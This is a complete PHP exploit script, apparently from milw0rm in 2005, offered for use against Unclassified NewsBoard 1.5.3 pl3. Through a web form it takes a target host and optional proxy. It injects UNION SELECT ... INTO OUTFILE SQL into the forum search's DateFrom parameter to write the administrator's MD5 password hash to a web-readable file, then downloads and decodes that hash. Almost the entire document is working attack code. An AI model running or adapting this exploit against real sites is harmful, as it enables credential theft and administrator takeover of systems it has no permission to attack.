<?php
#   ---UNB153pl3_xpl.php                                      11.35 12/11/2005 #
#                                                                              #
#          Unclassified NewsBoard 1.5.3 patch level 3 "Datefrom" blind SQL     #
#                   injection /  Admin MD5 password hash dump                  #
#                              by rgod                                         #
#                  site: http://rgod.altervista.org                            #
#                                                                              #
#  usage: launch from Apache, fill in requested fields, then go!               #
#                                                                              #
#  make these changes in php.ini if you have troubles                          #
#  with this script:                                                           #
#  allow_call_time_pass_reference = on                                         #
#  register_globals = on                                                       #
#                                                                              #
#  Sun-tzu:"If he is taking his ease, give him no rest. If his forces are      #
#  united, separate them."                                                     #

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 2);
ob_implicit_flush (1);

echo'<html><head><title> Unclassified  NewsBoard  1.5.3pl3  blind  SQL injection
</title><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style type="text/css"> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:
#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img
{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}--></style></head><body><p class="Stile6">
Unclassified  NewsBoard  1.5.3pl3  blind  SQL  injection </p><p class="Stile6">a
script  by  rgod  at        <a href="http://rgod.altervista.org"target="_blank">
http://rgod.altervista.org</a></p><table width="84%"><tr><td width="43%">  <form
name="form1"      method="post"   action="'.$SERVER[PHP_SELF].'?path=value&host=
value&port=value&proxy=value"> <p> <input  type="text"  name="host">       <span
class="Stile5"> * hostname (ex: www.sitename.com) </span> </p> <p>        <input
type="text" name="path">   <span class="Stile5"> * path ( ex: /unb/  or just / )
</span></p><p> <input   type="text" name="fullpath"><span class="Stile5"> * full
path to site,  need  this for "INTO OUTFILE" statement (ex.: C:\\\www\\\site\\\)
</span></p><p>   <input type="text" name="table_prefix">   <span class="Stile5">
specify a table  prefix other than the default (unb1_)</span>      </p><p><input
type="text"  name="port"> <span class="Stile5">specify  a  port  other  than  80
( default  value )  </span>  </p> <p>  <input  type="text"  name="proxy">  <span
class="Stile5">  send  exploit  through  an  HTTP proxy (ip:port) </span></p><p>
<input type="submit"name="Submit" value="go!"> </p> </form> </td> </tr> </table>
</body></html>';

function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '<table border="0"><tr>';
while ($ii <= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo "<td>&nbsp;&nbsp;</td>";
             for ($li=0; $li<=15; $li++)
                      { echo "<td>".$headeri[$li+$ki]."</td>";
			    }
            $ki=$ki+16;
            echo "</tr><tr>";
            }
if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
{echo "<td>".$datai."</td> ";}
$ii++;
$ji++;
}
for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo "<td>&nbsp&nbsp</td>";
                       }

for ($li=$ci*16; $li<=strlen($headeri); $li++)
                      { echo "<td>".$headeri[$li]."</td>";
			    }
echo "</tr></table>";
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket() //if you have sockets module loaded, 2x speed! if not,load
		              //next function to send packets
{
  global $proxy, $host, $port, $packet, $html, $proxy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket < 0) {
                   echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
                   }
	      else
 		  {   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
                    echo "OK.<br>";
                    echo "Attempting to connect to ".$host." on port ".$port."...<br>";
                    if ($proxy=='')
		   {
		     $result = socket_connect($socket, $host, $port);
		   }
		   else
		   {

		   $parts =explode(':',$proxy);
                   echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
		   $result = socket_connect($socket, $parts[0],$parts[1]);
		   }
		   if ($result < 0) {
                                     echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
                                    }
	                       else
		                    {
                                     echo "OK.<br><br>";
                                     $html= '';
                                     socket_write($socket, $packet, strlen($packet));
                                     echo "Reading response:<br>";
                                     while ($out= socket_read($socket, 2048)) {$html.=$out;}
                                     echo nl2br(htmlentities($html));
                                     echo "Closing socket...";
                                     socket_close($socket);

				    }
                  }
}
function sendpacketii($packet)
{
global $proxy, $host, $port, $html, $proxy_regex;
if ($proxy=='')
           {$ock=fsockopen(gethostbyname($host),$port);}
             else
           {
	   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
	   $parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	    $ock=fsockopen($parts[0],$parts[1]);
	    if (!$ock) { echo 'No response from proxy...';
			die;
		       }
	   }
fputs($ock,$packet);
if ($proxy=='')
  {

    $html='';
    while (!feof($ock))
      {
        $html.=fgets($ock);
      }
  }
else
  {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
    {
      $html.=fread($ock,1);
    }
  }
fclose($ock);
echo nl2br(htmlentities($html));
}


if (($host<>"") and ($path<>"") and ($fullpath<>""))
{
$port=intval(trim($port));
if ($port=='') {$port=80;}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($table_prefix=='') {$table_prefix="unb1_";}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

#STEP 1 -> Dump Admin MD5 password hash...
$SQL="9999999999) UNION SELECT ORD(SUBSTRING(Password,1,1)),ORD(SUBSTRING(Password,2,1)),ORD(SUBSTRING(Password,3,1)) FROM ".$table_prefix."users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,4,1)),ORD(SUBSTRING(Password,5,1)),ORD(SUBSTRING(Password,6,1)) FROM ".$table_prefix."users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,7,1)),ORD(SUBSTRING(Password,8,1)),ORD(SUBSTRING(Password,9,1)) FROM ".$table_prefix."users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,10,1)),ORD(SUBSTRING(Password,11,1)),ORD(SUBSTRING(Password,12,1)) FROM ".$table_prefix."users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,13,1)),ORD(SUBSTRING(Password,14,1)),ORD(SUBSTRING(Password,15,1)) FROM ".$table_prefix."users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,16,1)),ORD(SUBSTRING(Password,17,1)),ORD(SUBSTRING(Password,18,1)) FROM ".$table_prefix."users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,19,1)),ORD(SUBSTRING(Password,20,1)),ORD(SUBSTRING(Password,21,1)) FROM ".$table_prefix."users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,22,1)),ORD(SUBSTRING(Password,23,1)),ORD(SUBSTRING(Password,24,1)) FROM ".$table_prefix."users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,25,1)),ORD(SUBSTRING(Password,26,1)),ORD(SUBSTRING(Password,27,1)) FROM ".$table_prefix."users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,28,1)),ORD(SUBSTRING(Password,29,1)),ORD(SUBSTRING(Password,30,1)) FROM ".$table_prefix."users WHERE ID=1
                  UNION SELECT ORD(SUBSTRING(Password,31,1)),ORD(SUBSTRING(Password,32,1)),NULL INTO OUTFILE '".$fullpath."suntzu' FROM ".$table_prefix."users WHERE ID=1/*";
$SQL=urlencode($SQL);
$packet="GET ".$p."forum.php?req=search&Query=suntzu&ResultView=2&Sort=2&DateFrom=".$SQL."&DateUntil=&Forum=0 HTTP/1.1\r\n";
$packet.="Referer: http://".$host.":".$port.$path."forum.php?req=search&unb236sess=\r\n";
$packet.="Accept-Encoding: text/plain\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
show($packet);
sendpacketii($packet);


#STEP 2 -> Retrieve dump and decode...
$packet="GET ".$p."suntzu HTTP/1.1\r\n";
$packet.="Accept-Encoding: text/plain\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
show($packet);
sendpacketii($packet);

if (eregi("200 OK",$html))
{
$temp=explode(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html);
$dump=$temp[1];
$temp2=''; $HASH='';
for ($i=0; $i<=strlen($dump)-1; $i++)
{
  if (($dump[$i]==chr(0x09)) or ($dump[$i]==chr(0x0a)))
       {$HASH.=chr($temp2); $temp2='';}
  else
     {$temp2.=$dump[$i]; if ($temp2=="\N") {break;} }
}
echo "<br>Exploit succeeded -> ".$HASH;
}
else
{echo "Exploit failed...";}
}
else
{echo "Fill * requested fields, optionally specify a proxy...";}

?>

# milw0rm.com [2005-11-14]
